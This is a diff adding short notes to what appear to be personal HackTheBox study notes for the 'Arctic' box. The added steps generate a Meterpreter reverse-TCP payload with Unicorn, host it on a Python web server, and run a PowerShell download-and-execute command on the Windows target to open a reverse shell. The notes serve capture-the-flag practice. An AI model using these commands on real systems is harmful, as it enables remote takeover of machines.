@@ -387,6 +387,36 @@
 
 [Writeup UNC Chapell Students](https://ntropy-unc.github.io/jekyll/update/post/writeup/htb/2019/01/09/arctic-WriteUp.html)
 
+Take aways:
+
+Use [Unicorn](https://github.com/trustedsec/unicorn) to upgrade shells
+
+```
+unicorn windows/meterpreter/reverse_tcp $local_ip $local_port
+```
+
+This will generate one rc file for msf and one powershell script.
+
+Start metasploit:
+
+```
+msfconsole -r unicorn.rc
+```
+
+Cut the powershell payload to only the part in double quotes and save in shell.html
+
+Start a local webserver to serve file.
+
+```
+python -m http.server 80
+```
+
+Execute in windows console
+
+```
+powershell "IEX(New-Object Net.WebClient).downloadString('http://$IP/shell.html')"
+```
+
 ---
 
 ### Silo
